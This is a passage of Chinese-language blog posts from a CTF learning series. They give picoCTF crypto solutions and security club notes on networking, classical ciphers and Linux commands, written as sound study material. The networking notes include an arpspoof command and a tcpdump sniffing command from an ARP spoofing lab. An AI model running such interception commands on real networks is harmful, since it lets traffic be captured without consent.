ppb\\xc3\\x88r\\n\\nwhat should we do for you? \\nE --&gt; encrypt D --&gt; decrypt. \\n'In [12]: password = int(\"707062c872\", 16) // 2In [13]: long_to_bytes(password).decode()Out[13]: '881d9'\n$ openssl enc -aes-256-cbc -d -in secret.encenter AES-256-CBC decryption password:*** WARNING : deprecated key derivation used.Using -iter or -pbkdf2 would be better.picoCTF{su......b6}\n第二題：Custom encryption \n按照題目給的 script 一步步倒推回去就可以得到答案了\nfrom math import gcda = 95b = 21sharded_key = gcd(237915, 1850450, 1850450, 158610, 2458455, 2273410, 1744710, 1744710, 1797580, 1110270, 0, 2194105, 555135, 132175, 1797580, 0, 581570, 2273410, 26435, 1638970, 634440, 713745, 158610, 158610, 449395, 158610, 687310, 1348185, 845920, 1295315, 687310, 185045, 317220, 449395) // 311cipher = [237915, 1850450, 1850450, 158610, 2458455, 2273410, 1744710, 1744710, 1797580, 1110270, 0, 2194105, 555135, 132175, 1797580, 0, 581570, 2273410, 26435, 1638970, 634440, 713745, 158610, 158610, 449395, 158610, 687310, 1348185, 845920, 1295315, 687310, 185045, 317220, 449395]semi_cipher = \"\"for char in cipher:    semi_cipher += (chr(char//sharded_key//311))def dynamic_xor_decrypt(cipher_text, text_key):    rev_ans = \"\"    key_length = len(text_key)    for i, char in enumerate(cipher_text):        key_char = text_key[i % key_length]        encrypted_char = chr(ord(char) ^ ord(key_char))        rev_ans += encrypted_char    return rev_ans[::-1]plain_text = dynamic_xor_decrypt(semi_cipher, \"trudeau\")print(plain_text)\n第三題：C3 \n一樣按照編碼器構造出解碼器\nlookup1 = \"\\n \\\"#()*+/1:=[]abcdefghijklmnopqrstuvwxyz\"lookup2 = \"ABCDEFGHIJKLMNOPQRSTabcdefghijklmnopqrst\"cipher = \"DLSeGAGDgBNJDQJDCFSFnRBIDjgHoDFCFtHDgJpiHtGDmMAQFnRBJKkBAsTMrsPSDDnEFCFtIbEDtDCIbFCFtHTJDKerFldbFObFCFtLBFkBAAAPFnRBJGEkerFlcPgKkImHnIlATJDKbTbFOkdNnsgbnJRMFnRBNAFkBAAAbrcbTKAkOgFpOgFpOpkBAAAAAAAiClFGIPFnRBaKliCgClFGtIBAAAAAAAOgGEkImHnIl\"ans = \"\"prev = 0for char in cipher:    cur = (lookup2.index(char) + prev) % 40    ans += lookup1[cur]    prev = curprint(ans)\n神奇地得到了一串新的 python 2 程式碼\n#asciiorder#fortychars#selfinput#pythontwochars = \"\"from fileinput import inputfor line in input():    chars += lineb = 1 / 1for i in range(len(chars)):    if i == b * b * b:        print chars[i] #prints        b += 1 / 1\n把修改成 python3 的程式碼然後再把這串程式碼當成輸入就得到 flag 了\npicoctf{a....s}\n第四題：rotation \n根據題目給的密文隨便 rotate 一下就得到答案了\n\n\nImage\n\n第五題：ReadMyCert \n查了一下解析 cert 的指令，然後就得到 flag 了\n\n\nImage\n\n第六題：HideToSee \n查了一下隱寫術的工具，想用用 Steghide 但 mac\n一時裝不起來就隨便找了一個 online tool\n解出了一串看起來一副快是 flag 的東西\nkrxlXGU{zgyzhs_xizxp_05y2z65z}\n然後再用圖片中講到的 Atbash Cipher 解密看看，就成功得到 flag 了\n\n\nImage\n\n總結 \n最後一天了，鐵人賽這段時間是我第一次這樣長時間接觸這些資安技術、刷\nCTF 題目，來看一下最後的成果\n\n每天六題 picoCTF\n\n達成： 103 / 174 題\n\n每三天一部 Beef Soup 的教學影片\n\n達成： 6 / 9 部\n\n\n我的達成率大概只有 6 成\nww，不過學到的技術還是挺多的，知道各種常見的題型，因為跟著課程學，主要還是在玩\nWeb ，像是 path traversal, lfi, sql injection, … 一大堆可以玩的洞，而\nCrypto, pwn, reverse 都還沒有太多研究，目前感覺 web 的這些 CTF\n題目很好玩，雖然知道題目都是設計過的，但每次把一個看似一切正常的網站打出一個洞就很有成就感，之後應該會慢慢點開自己的技能樹，去參加一些酷酷的比賽\n(可是最近真的參加太多活動太多了 RRRRRRRR)\n","categories":["IThome 2024 鐵人賽","一直刷 CTF"],"tags":["資安","CTF","IThome 2024 鐵人賽"]},{"title":"IThome 2024 鐵人賽 一直刷 CTF - Day29","url":"/IThome_2024ironman_CTF_Day29/","content":"前言 \n本日進度：\n\n【成大資安社社課】淺談網路與\nH T T P\n\n\n淺談網路與 H T T P \n什麼是網路？ \n簡單來說就是把很多台電腦用網路線或是 WIFI\n串連在一起就是所謂的網路了\n可以比喻為一個送信的過程\n\n撰寫信件內容\n放進信封決定要掛號還是平信，還有寄給誰\n季見底止和收件地址\n把信給郵局，然後轉發到其他郵局再送到收件人手上（如果你要送的人就在你家隔壁，你就直接給他就好了）\n\n網路也是一樣的概念，假設要去瀏覽 Google 這個網站\n\nApplication layer (信件內容)\n\nTransport layer (信封)\n\nNetwork layer (寄件人和收件人)\n\n\nLink layer (郵局)\n\n\n什麼事 Mac Address \n\n\nImage\n\n跟 IP 的差異是 IP 是可以變動的， Mac Address\n是固定的，所以在區域網路裡面是檢查 Mac Address 的，而不是 IP Address\n在古代沒有 Switch 的時候， 適用 Hub 來連接多台電腦，但是 Hub\n是沒有腦袋的，他會把信送給所有人，每台電腦會檢查 Mac Address\n看那封信是不是寄給自己的，如果是就接收，如果不是就丟掉\n\n\nImage\n\n在有 Switch 後就只會把信送給對的人\n\n\nImage\n\n但在我們瀏覽網頁是用 IP Address 來找到對方的，要找到對方的 Mac\nAddress 就要用 ARP 協定\n\n\n會有一個 ARP Table 來記錄對方的 Mac\nAddress，固定一段時間後會清理和更新\n會不會有資安問題？\n會的，如果在我問目標的 Mac Address 時，有壞人騙我說他是目標的 Mac\nAddress，這樣就會把信送給壞人，這就是 ARP Spoofing\n\n\nImage\n\nLab - ARP Spoofing \nLab 關掉了不能玩 😥\n\n\nImage\n\nsudo tcpdump -Ai eth1\ntcpdump 去聽封包的內容， -A 是把封包的內容顯示出來，\n-i 是指定網卡\nsudo arpspoof -i eth1 -t 192.168.111.1 192.168.111.2\n這個指令就會幫你實作 ARP Spoofing 把 192.168.111.1\n要傳給 192.168.111.2 的封包攔截\n\n\nImage\n\n什麼是網路 - 網段 \n\n\nImage\n\n上下最不同的是，上面的送的人是區域網路，下面的是送給區域外的人，所以他是要經過\nRouter 來轉發的\n一樣用寄信來比喻\n\n\nImage\n\n\n\nImage\n\n上下最大的差異就是在區域內還是區域外，在網路內也是一樣的，要怎沒看是在區域內外等等會講\n\n\nImage\n\n\n\nImage\n\n可以通過判斷目標 IP 是否是寄給 Default Gateway\n來判斷是區域內還是區域外\n\n\nImage\n\n如何知道來源 IP 和目標 IP 是不是在同一個網段？\n\n\nImage\n\n把 Address 和 Netmask 的二進制做 AND 運算，就會是 Network ID\n，俗果兩個 Network ID 一樣就是在同一個網段 (所以如果 netmask 是\n255.255.255.0 的話其實就看 IP\n前九碼是不是都一樣就知道是不是在同區域，如果 netmask 是\n255.255.0.0 就看 IP 前六碼)\n/24 的意思 255.255.255.0 轉成二進制是\n11111111.11111111.11111111.00000000 ，因為有 24 個\n1，就表示成 /24\n什麼是網路 - 路由 \n資料送到 router 時， router 會根據上面的路由表傳送 packet\n，路由會根據他的路由地圖來決定要傳送給誰（就像我們可以利用 mtr\n看到我們資料是怎麼傳送目標的)\n\n\nImage\n\n上面這個就是路由表，如果是 192.168.20.5 就會通過 192.168.20.2\n出去\n\n\nImage\n\nrouter table 會以 netmask 最長的為優先\ndefault gateway 就是 0.0.0.0/0 的縮寫，那如果沒有\ndefault gateway 就會找不到路徑，就會出現\nDestination Host Unreachable\nTCP vs UDP \n\n\nImage\n\nUDP \n就是直接丟過去，不管有沒有真的收到\n\n\nImage\n\nTCP \n如果需要可靠信傳送，要是資料很大用 UDP 傳過去可能就會很破碎，TCP\n就會每次都確認有沒有收到，有收到後才會傳下一個\n\n\nImage\n\n\n\nImage\n\n\n\nImage\n\n\n\nImage\n\n因為 TCP 的效能有點差，現在有一個叫做 QUIC 的協定，他是基於 UDP\n的，但是他有 TCP 的功能，所以效能會比較好\nPort \n因為一台電腦上有很多程式，所以要用 Port 來區分，每個服務都有自己的\nPort，像是 HTTP 預設是 80，HTTPS 是 443\nNAT \n現今 IPv4 最嚴重的問題，就是 IP 數量不夠用，因為 IP 最多就只有\n2^32 個，也就是 4,294,967,296 個，而且還有一些\nIP\n是不能用的，很明顯不可能讓地球上每個人都能用，這樣就會有些人沒有辦法用網路，所以就有兩個辦法\n\n換一個 IP 的協議: IPv6，但因為目前很多服務都是架在 IPv4\n上，大家也都還習慣用 IPv4，所以短期間就只能用下面那個方法\nNAT: 既然我們 IP 不夠用，那就讓一些電腦有 IP 就好，其他電腦用假的\nIP\n\n\nRouter 會有一個 NAT Table 來記錄每個請求的 Source IP 和 Destination\nIP，然後再把 Source IP 改成 Router 的\nIP，然後再把封包送出去，當對方回應時， Router 會根據 NAT Table\n把封包送到對應的電腦\n但這樣還有個問題，如果有個 Server 架在 NAT\n後面，外面就戳不到，解決的方法就是 Port Forwarding\n\n\n會把外面送進拉的 Port 轉換成對應的內部 IP\nHow does NAT work\n\n什麼是協定 \n\n\nImage\n\nHTTP \n\nHTTP/2 之前的版本是一種建立在 TCP 上的傳輸協定。(HTTP/3\n例外，今天不提)\n為何需要使用 TCP 是因為網頁他會需要可靠性的傳輸。\n\n\n\nImage\n\nRequest \n\n\nImage\n\n路徑就是想要檔案的位置\nResponse \n\n\nImage\n\nstatus code:\n2 開頭成功，3 開頭重新導向，4 開頭客戶端錯誤，5 開頭伺服器錯誤\nHTTP Lab \n\n\nImage\n\n\n\nImage\n\nHTTP\nMethod\nDNS \n\n全名叫做 Domain Name System，是一種建立在 UDP 的協定。\n主要用來查詢 Domain Name 的 IP Address 或是查詢 IP Address 對應的 Domain\nName。\n那什麼是 Domain Name 呢？\n\n\n\nImage\n\n\n\nImage\n\nDNS Lab \n\n\nImage\n\n\n\nImage\n\nLinux 基礎指令與使用者管理 \n\n\nImage\n\nKernel Space vs User Space \n\n\nImage\n\n區分成這樣是為了讓 Kernel 方便管理 User Space 的 Application\n，避免有些 Application 搶資源，這時候就可以由 Kernel Space\n停止那些指令運行\nShell \n\n\nImage\n\nSSH \nSecure Shell Protocol\n\n\nImage\n\nSSH\n金鑰登入 就不用打密碼了\nLinux 目錄架構 \n\n\nImage\n\n檔案種類 \n\n\nImage\n\n正規檔案 (Regular File) \n\n檔案類型：-\n純文字檔 (ASCII)、二進位檔 (binary)、資料格式檔 (data)\n\n目錄 (Directory) \n\n檔案類型：d\n就是目錄\n\n連結檔 (link) \n\n檔案類型：l\n就同於 Windows 下的捷徑\n\n設備與裝置檔 (device) \n\n區塊 (block) 設備檔\n\n檔案類型：b\n硬碟或儲存設備\n\n字元 (character) 設備檔\n\n檔案類型：c\n鍵盤、滑鼠等\n\n\n資料接口檔 (sockets) \n\n檔案類型：s\n讓兩個程式做溝通，讓一個程式把資料灌進 sockets ，另一個程式就可以從\nsockets 拿資料\n\n資料輸送檔 (FIFO, pipe) \n\n檔案類型：p\n讓不同進程間能溝通\n\n用戶與群組 \n用戶：就用戶\n群組：主群組和附加群組\n用戶 /etc/password \n\n\nImage\n\n密碼不會存在這，所以上面是寫 x\n用戶 /etc/shadow \n\n\nImage\n\n群組 /etc/group \n\n\nImage\n\n群組 /etc/gshadow \n\n\nImage\n\n權限 \n\n\nImage\n\n目錄的權限 \n\nr ：\n\n表示具有讀取目錄結構清單的權限，可以查詢該目錄下的檔名資料。\n\nw ：\n\n建立新的檔案與目錄；\n\n刪除已經存在的檔案與目錄 (不論該檔案的權限為何！)\n\n將已存在的檔案或目錄進行更名；\n\n搬移該目錄內的檔案、目錄位置。\n\nx (access directory)：\n\n使用者能否進入該目錄成為工作目錄的用途（能否 cd 進入）\n\n\n\n\nImage\n\n特殊權限 SUID/SGID/SBIT \n\nSUID：執行時相當於擁有檔案 owner 的權限，僅對檔案生效\n\nSGID：\n\n對檔案設定：執行時相當於擁有檔案 group 的權限\n\n對目錄設定：此目錄下的有效群組 (effective\ngroup) 將會變成該目錄的群組\n\nSBIT：僅能對目錄設定，使用者在該目錄下建立檔案或目錄時，僅有自己與 root\n才有權力刪除該檔案\n\nSUID = 4 SGID = 2 SBIT = 1 _755\n\n\n\nImage\n\nUmask \n他的值會是 777 減去 umask 的值，所以如果 umask 是 022 的話，那就是\n755\n-S: 顯示成比較好檢視的樣子\n\n\nImage\n\n未知的指令 \n\nGoogle\nman xxx\nxxx -h / xxx --help\n\n常見指令 \n\ncd: change directory (可用絕對路徑或相對路徑)\npwd: print working directory\nls: list\n\n-a: 顯示隱藏檔\n-l: 顯示詳細資訊 (ll 是 ls -l\n的縮寫)\n\nexa: 跟 ls 類似，但是有顏色\nrm: remove\n\n-r: 遞迴刪除\n-f: 強制刪除\n\ncp: copy\nmv: move\ncat: concatenate\ntac: 反向顯示\nod: octal dump\nnl: number lines (會把檔案的每一行編號)\nmore: 一次顯示一頁\nless: 也是一次顯示一頁，但是可以往前翻 (vim\n的操作方式)\nmkdir: make directory\ntouch: 建立檔案\nrmdir: remove directory\nnano: 編輯器\nvi: 很棒的編輯器\nvim: 更棒的編輯器\nchmod: change mode\n\nchmod 777 xxx: 三個數字分別代表\nuser/group/others，每個數字代表 rwx，所以 777 就是全部都有 rwx\nchmod -x xxx: 移除所有人對 xxx 的執行權限\nchmod +x xxx: 給所有人對 xxx 的執行權限\nchmod u+x xxx: 給 user 對 xxx 的執行權限 (u = user, g =\ngroup, o = others, a = all)\n也可設定 SUID/SGID/SBIT 可以用 chmod 4755 xxx 來設定\nSUID ，然後+s 來設定 SUID / SGID，+t 來設定\nSBIT\n\nchown: change owner\n\nchown user xxx: 把 xxx 的 owner 改成 user\nchown user:group xxx: 把 xxx 的 owner 改成 user，group\n改成 group\n\nchgrop: change group\n\nchgrp group xxx: 把 xxx 的 group 改成 group\n\nchattr: change attribute\n\nchattr +i xxx: 讓 xxx 變成不可刪除\nchattr +a xxx: 讓 xxx 變成只能增加資料，不能刪除\n其他不常用需要再看\n\nlsattr: 顯示檔案屬性\npasswd: 更改密碼\nwhich / whereis: 找指令的位置\ntar: 包裝 or 壓縮檔案\n\nv: 顯示詳細資訊\nf: 檔案名稱\nc: 建立壓縮檔\nj: 用 bzip2 壓縮\nz: 用 gzip 壓縮\nJ: 用 xz 壓縮\nx: 解壓縮\ntar -cvf xxx.tar xxx: 壓縮\ntar -xvf xxx.tar: 解壓縮\ntar -zcvf xxx.tar.gz xxx: 壓縮成 .tar.gz\ntar -zxvf xxx.tar.gz: 解壓縮 .tar.gz\n\npipe: |，把前面的結果傳給後面\n\n例如 ls | grep xxx 就是把 ls 的結果傳給\ngrep 來找 xxx\n\nsleep: 會暫停後面接的秒數\n一些特殊 combo\n\nCtrl+C: 中斷目前的指令\nCtrl+Z: 暫停目前的指令 (suspended)\n\njobs: 查看暫停的指令\nfg: 把暫停的指令恢復 (利用 %{number}\n來指定要恢復 jobs 中指令的編號)\nbg: 把暫停的指令變成背景執行\n\nCtrl+D: EOF\n\nredirect:\n&gt;，把前面的結果寫到後面的檔案，&gt;&gt; 是\nappend， &lt; 是把檔案的內容傳給後面的指令\n\nls &gt; xxx.txt 就是把 ls 的結果寫到\nxxx.txt\nls &gt;&gt; xxx.txt 就是把 ls 的結果\nappend 到 xxx.txt\ncat &lt; xxx.txt 就是把 xxx.txt 的內容傳給\ncat\n2&gt; 是把錯誤訊息寫到檔案\n\nregex\n\n可以在 regexlearn 學\n在 regex101 測試\n.: 任意字元\n*: 0 到無限多次\n+: 1 到無限多次\n[abc]: a, b, c 任一個\n[^abc]: 除了 a, b, c 之外\n[a-z]: a 到 z 之間\n\nsed: stream editor 有點複雜，會用到的時候再查就好\ngrep: global regular expression print\n\n-i: 不分大小寫\n-v: 反向選取\n-n: 顯示行數\n-r: 遞迴\n-l: 只顯示檔名\n-c: 只顯示數量\n-e: 多個條件\n-E: 正規表達式\n-A: 顯示後面幾行\n-B: 顯示前面幾行\n-C: 顯示前後幾行\ngrep xxx *: 在所有檔案中找 xxx\n\nfind: 找檔案\nbash script\n\n就是用 .sh 結尾的檔案，然後裡面寫一些指令\n然後在檔案裡面寫一些指令，chmod\n加執行權限就可以執行了\n\ncrontab: 定時執行\n\ncrontab -e: 編輯\ncrontab -l: 列出\ncrontab -r: 刪除\n* * * * * xxx: 分鐘 小時 日 月 星期幾 指令\n\napt / mirror: 安裝套件\n\napt update: 更新套件\napt upgrade: 升級套件 (順序會是先更新再升級)\napt install xxx: 安裝套件\napt remove xxx: 移除套件\napt search xxx: 搜尋套件\napt list: 列出所有套件\napt show xxx: 顯示套件資訊\napt autoremove: 移除不需要的套件\napt clean: 清除快取\napt autoclean: 清除舊的快取\n\n$(): 會優先執行 ()\n指令的標準輸出，當成前面的指令的參數\n\n例如 echo $(ls) 就是把 ls 的結果傳給\necho\n\ncut: 切割\n\n-d: 分隔符號\n-f: 第幾個\ncut -d \" \" -f 1 xxx: 以空格切割，取第一個\n\n\n參考資料 \n\n【成大資安社社課】手把手 Python 教學\n— 從入門到入侵\n【成大資安社社課】WEB\n1\n【成大資安社社課】WEB\n2\n【成大資安社社課】不是 web3.0 的\nweb3 - Vincent55\n【成大資安社社課】Crypto\n1\n【成大資安社社課】Crypto\n2\n【成大資安社社課】Linux\n基礎指令與使用者管理\n【成大資安社社課】淺談網路與\nH T T P\n\n","categories":["IThome 2024 鐵人賽","一直刷 CTF"],"tags":["資安","CTF","IThome 2024 鐵人賽"]},{"title":"IThome 2024 鐵人賽 一直刷 CTF - Day28","url":"/IThome_2024ironman_CTF_Day28/","content":"前言 \n本日進度：\n\n【成大資安社社課】Crypto\n1 - 完\n\n\n上課紀錄 \nXOR \n\n\nImage\n\nMOD \n\n\nImage\n\nLab - XOR wormup \n改一下他的程式碼就可以得到 Flag 了\nfrom Crypto.Random import get_random_bytes# from flag import FLAGFLAG = bytes.fromhex(\"603ad76575ed41dd3fd38be80d6edfdc569e2a324c928741129e210e2c934aa3770ff8d4f0c5340e82d9c0eea5\")def xor_bytes(a, b):    return bytes(x ^ y for x, y in zip(a, b))random_data = bytes.fromhex(\"0209e4030e9929b44c8ce29b5216b0ae09ed456d29f3f4386be7585114f22ec2436ecdb795f2506db0bff5dcd8\")result = xor_bytes(FLAG, random_data)print({result.decode()})\n流密碼 \n\n\nImage\n\n隨機數 \n\n\nImage\n\n偽隨機數 \n\n\nImage\n\n\n\nImage\n\n線性同餘生成器\n(Linear Congruential Generator) \n\n\nImage\n\n\n\nImage\n\n\n\nImage\n\n\n\nImage\n\n其他常見方法 \n\n\nImage\n\n反饋位移生成器 (Feedback\nShift Register) \n\n\nImage\n\n\n\nImage\n\nlab - eof-almost baby prng \nlab - easy lcg \nlab - eof lf3r \n對稱式加密 \n\n\nImage\n\n重點是 使用同一把鑰匙\n基本策略 \n\nConfusion\n\n混淆密文和密鑰的關係，使難以從密文推斷出密鑰\n\nDefusion\n\n改變一點點明文，就能改變很多密文\n\n\nFeistel Network \n\n\nImage\n\nDES (Data Encryption Standard) \n\n\nImage\n\n\n\nImage\n\n\n\nImage\n\n\n\nImage\n\nSubstitution-Permutation\nNetwork \n\n\nImage\n\nAES (Advanced Encryption\nStandard) \n\n\nImage\n\n\n\nImage\n\n\n\nImage\n\n\n\nImage\n\nTODO \n之後好好研究一下原理還有把上面三題 lab 做完\n參考資料 \n\n【成大資安社社課】手把手 Python 教學\n— 從入門到入侵\n【成大資安社社課】WEB\n1\n【成大資安社社課】WEB\n2\n【成大資安社社課】不是 web3.0 的\nweb3 - Vincent55\n【成大資安社社課】Crypto\n1\n【成大資安社社課】Crypto\n2\n【成大資安社社課】Linux\n基礎指令與使用者管理\n【成大資安社社課】淺談網路與\nH T T P\n\n","categories":["IThome 2024 鐵人賽","一直刷 CTF"],"tags":["資安","CTF","IThome 2024 鐵人賽"]},{"title":"IThome 2024 鐵人賽 一直刷 CTF - Day27","url":"/IThome_2024ironman_CTF_Day27/","content":"前言 \n本日進度：\n\n【成大資安社社課】Crypto\n1 - 古典密碼學\n\n\nCrypto 1 \n棒棒的練習資源\n\n編碼\n古典密碼\n穿插「ㄧ」點數學\n流加密\n對稱式加密\n\n先裝套件 \npip install pycryptodome\n什麼是編碼 \n\n「編碼器（英語：Encoder）是一種將資訊由一種特定格式轉換為其他特定格式的感測器、軟體或是演算法，轉換的目的可能是由於標準化、速度、保密性、保安或是為了壓縮資料。」—— 維基百科\n\n\n\nImage\n\n\n\nImage\n\n\n\nImage\n\n常見文字編碼 \n\nASCI\n\n用一個 byte\n來表示字母、數字、符號，是針對英文設計的，Unicode 的最初 128 個字符與 ASCII 完全相同\n(因為只有了 128 種可能，所以最左邊的 bit 永遠是 0)\n\nUTF-8\n\n用 1~4 bytes 來表示一個字符，也包含了 ASCII 的字符，因為 ASCII\n的字符只用 1 byte 表示，所以 UTF-8 能完全兼容原先是 ASCII\n編碼的文件\n容納了各國語言，算是 Unicode 的一種實現方式\n\nHEX (16 進位)\nBase64\n\n用 64 個字符來表示二進位數據，常用於在\nURL、Cookie、網頁中傳輸少量二進位數據，常見編碼結果會有 =, ==\n\n\nLab - Complex Encoder \n要先用 Base64 解碼，再用 HEX 解碼\n\n\nImage\n\nLab - F**k Encoder \n用 BrainFuck 和 JSFuck 都試試看，然後發現用 JSFuck 解密\nFlag 就出來了\n古典密碼學 \n加解密的用途 \n\n\nImage\n\n即便被攔截如果加解密夠好，也能確保密文不被破譯\n常見的加解密 \n\n凱薩密碼\n\nROT13\n曹操密碼\n\n簡易替換密碼\n\n\n\nImage\n\n解密方式：頻率分析\n\n\nImage\n\n\n維吉尼亞密碼（Vigenere）\n\n\n\nImage\n\n\n\nImage\n\n用密鑰長度切分，每一段相同位置的偏移量會相同 (例如上圖的 CSASTPK 的 K\n和 CSASTPI 的 I 同樣都是向右偏移兩格)\n，這樣就能分別對相同位置的字幕做頻率分析\n\n波雷費密碼 (Playfair)\n\n\n\nImage\n\n\n柵欄密碼 (Rail fence)\n\n\n\nImage\n\n密鑰是有幾個 _\n\n\nLab - vigenere cipher \n線上解密工具\n然後找了一下就發現了一個看起來像正確 flag 的字串\n\n\nImage\n\nLab - secure substitution \n線上解密工具\n丟上去跑出來的第一個就是 Flag 了\n\n\nImage\n\n參考資料 \n\n【成大資安社社課】手把手 Python 教學\n— 從入門到入侵\n【成大資安社社課】WEB\n1\n【成大資安社社課】WEB\n2\n【成大資安社社課】不是 web3.0 的\nweb3 - Vincent55\n【成大資安社社課】Crypto\n1\n【成大資安社社課】Crypto\n2\n【成大資安社社課】Linux\n基礎指令與使用者管理\n【成大資安社社課】淺談網路與\nH T T P\n\n","categories":["IThome 2024 鐵人賽","一直刷 CTF"],"tags":["資安","CTF","IThome 2024 鐵人賽"]},{"title":"IThome 2024 鐵人賽 一直刷 CTF - Day26","url":"/IThome_2024ironman_CTF_Day26/","content":"前言 \n本日進度：\n\n【成大資安社社課】Linux\n基礎指令與使用者管理\n\n\nLinux 基礎指令與使用者管理 \n\n\nImage\n\nKernel Space vs User Space \n\n\nImage\n\n區分成這樣是為了讓 Kernel 方便管理 User Space 的 Application\n，避免有些 Application 搶資源，這時候就可以由 Kernel Space\n停止那些指令運行\nShell \n\n\nImage\n\nSSH \nSecure Shell Protocol\n\n\nImage\n\nSSH\n金鑰登入 就不用打密碼了\nLinux 目錄架構 \n\n\nImage\n\n檔案種類 \n\n\nImage\n\n正規檔案 (Regular File) \n\n檔案類型：-\n純文字檔 (ASCII)、二進位檔 (binary)、資料格式檔 (data)\n\n目錄 (Directory) \n\n檔案類型：d\n就是目錄\n\n連結檔 (link) \n\n檔案類型：l\n就同於 Windows 下的捷徑\n\n設備與裝置檔 (device) \n\n區塊 (block) 設備檔\n\n檔案類型：b\n硬碟或儲存設備\n\n字元 (character) 設備檔\n\n檔案類型：c\n鍵盤、滑鼠等\n\n\n資料接口檔 (sockets) \n\n檔案類型：s\n讓兩個程式做溝通，讓一個程式把資料灌進 sockets ，另一個程式就可以從\nsockets 拿資料\n\n資料輸送檔 (FIFO, pipe) \n\n檔案類型：p\n讓不同進程間能溝通\n\n用戶與群組 \n用戶：就用戶\n群組：主群組和附加群組\n用戶 /etc/password \n\n\nImage\n\n密碼不會存在這，所以上面是寫 x\n用戶 /etc/shadow \n\n\nImage\n\n群組 /etc/group \n\n\nImage\n\n群組 /etc/gshadow \n\n\nImage\n\n權限 \n\n\nImage\n\n目錄的權限 \n\nr ：\n\n表示具有讀取目錄結構清單的權限，可以查詢該目錄下的檔名資料。\n\nw ：\n\n建立新的檔案與目錄；\n\n刪除已經存在的檔案與目錄 (不論該檔案的權限為何！)\n\n將已存在的檔案或目錄進行更名；\n\n搬移該目錄內的檔案、目錄位置。\n\nx (access directory)：\n\n使用者能否進入該目錄成為工作目錄的用途（能否 cd 進入）\n\n\n\n\nImage\n\n特殊權限 SUID/SGID/SBIT \n\nSUID：執行時相當於擁有檔案 owner 的權限，僅對檔案生效\n\nSGID：\n\n對檔案設定：執行時相當於擁有檔案 group 的權限\n\n對目錄設定：此目錄下的有效群組 (effective\ngroup) 將會變成該目錄的群組\n\nSBIT：僅能對目錄設定，使用者在該目錄下建立檔案或目錄時，僅有自己與 root\n才有權力刪除該檔案\n\nSUID = 4 SGID = 2 SBIT = 1 _755\n\n\n\nImage\n\nUmask \n他的值會是 777 減去 umask 的值，所以如果 umask 是 022 的話，那就是\n755\n-S: 顯示成比較好檢視的樣子\n\n\nImage\n\n未知的指令 \n\nGoogle\nman xxx\nxxx -h / xxx --help\n\n常見指令 \n\ncd: change directory (可用絕對路徑或相對路徑)\npwd: print working directory\nls: list\n\n-a: 顯示隱藏檔\n-l: 顯示詳細資訊 (ll 是 ls -l\n的縮寫)\n\nexa: 跟 ls 類似，但是有顏色\nrm: remove\n\n-r: 遞迴刪除\n-f: 強制刪除\n\ncp: copy\nmv: move\ncat: concatenate\ntac: 反向顯示\nod: octal dump\nnl: number lines (會把檔案的每一行編號)\nmore: 一次顯示一頁\nless: 也是一次顯示一頁，但是可以往前翻 (vim\n的操作方式)\nmkdir: make directory\ntouch: 建立檔案\nrmdir: remove directory\nnano: 編輯器\nvi: 很棒的編輯器\nvim: 更棒的編輯器\nchmod: change mode\n\nchmod 777 xxx: 三個數字分別代表\nuser/group/others，每個數字代表 rwx，所以 777 就是全部都有 rwx\nchmod -x xxx: 移除所有人對 xxx 的執行權限\nchmod +x xxx: 給所有人對 xxx 的執行權限\nchmod u+x xxx: 給 user 對 xxx 的執行權限 (u = user, g =\ngroup, o = others, a = all)\n也可設定 SUID/SGID/SBIT 可以用 chmod 4755 xxx 來設定\nSUID ，然後+s 來設定 SUID / SGID，+t 來設定\nSBIT\n\nchown: change owner\n\nchown user xxx: 把 xxx 的 owner 改成 user\nchown user:group xxx: 把 xxx 的 owner 改成 user，group\n改成 group\n\nchgrop: change group\n\nchgrp group xxx: 把 xxx 的 group 改成 group\n\nchattr: change attribute\n\nchattr +i xxx: 讓 xxx 變成不可刪除\nchattr +a xxx: 讓 xxx 變成只能增加資料，不能刪除\n其他不常用需要再看\n\nlsattr: 顯示檔案屬性\npasswd: 更改密碼\nwhich / whereis: 找指令的位置\ntar: 包裝 or 壓縮檔案\n\nv: 顯示詳細資訊\nf: 檔案名稱\nc: 建立壓縮檔\nj: 用 bzip2 壓縮\nz: 用 gzip 壓縮\nJ: 用 xz 壓縮\nx: 解壓縮\ntar -cvf xxx.tar xxx: 壓縮\ntar -xvf xxx.tar: 解壓縮\ntar -zcvf xxx.tar.gz xxx: 壓縮成 .tar.gz\ntar -zxvf xxx.tar.gz: 解壓縮 .tar.gz\n\npipe: |，把前面的結果傳給後面\n\n例如 ls | grep xxx 就是把 ls 的結果傳給\ngrep 來找 xxx\n\nsleep: 會暫停後面接的秒數\n一些特殊 combo\n\nCtrl+C: 中斷目前的指令\nCtrl+Z: 暫停目前的指令 (suspended)\n\njobs: 查看暫停的指令\nfg: 把暫停的指令恢復 (利用 %{number}\n來指定要恢復 jobs 中指令的編號)\nbg: 把暫停的指令變成背景執行\n\nCtrl+D: EOF\n\nredirect:\n&gt;，把前面的結果寫到後面的檔案，&gt;&gt; 是\nappend， &lt; 是把檔案的內容傳給後面的指令\n\nls &gt; xxx.txt 就是把 ls 的結果寫到\nxxx.txt\nls &gt;&gt; xxx.txt 就是把 ls 的結果\nappend 到 xxx.txt\ncat &lt; xxx.txt 就是把 xxx.txt 的內容傳給\ncat\n2&gt; 是把錯誤訊息寫到檔案\n\nregex\n\n可以在 regexlearn 學\n在 regex101 測試\n.: 任意字元\n*: 0 到無限多次\n+: 1 到無限多次\n[abc]: a, b, c 任一個\n[^abc]: 除了 a, b, c 之外\n[a-z]: a 到 z 之間\n\nsed: stream editor 有點複雜，會用到的時候再查就好\ngrep: global regular expression print\n\n-i: 不分大小寫\n-v: 反向選取\n-n: 顯示行數\n-r: 遞迴\n-l: 只顯示檔名\n-c: 只顯示數量\n-e: 多個條件\n-E: 正規表達式\n-A: 顯示後面幾行\n-B: 顯示前面幾行\n-C: 顯示前後幾行\ngrep xxx *: 在所有檔案中找 xxx\n\nfind: 找檔案\nbash script\n\n就是用 .sh 結尾的檔案，然後裡面寫一些指令\n然後在檔案裡面寫一些指令，chmod\n加執行權限就可以執行了\n\ncrontab: 定時執行\n\ncrontab -e: 編輯\ncrontab -l: 列出\ncrontab -r: 刪除\n* * * * * xxx: 分鐘 小時 日 月 星期幾 指令\n\napt / mirror: 安裝套件\n\napt update: 更新套件\napt upgrade: 升級套件 (順序會是先更新再升級)\napt install xxx: 安裝套件\napt remove xxx: 移除套件\napt search xxx: 搜尋套件\napt list: 列出所有套件\napt show xxx: 顯示套件資訊\napt autoremove: 移除不需要的套件\napt clean: 清除快取\napt autoclean: 清除舊的快取\n\n$(): 會優先執行 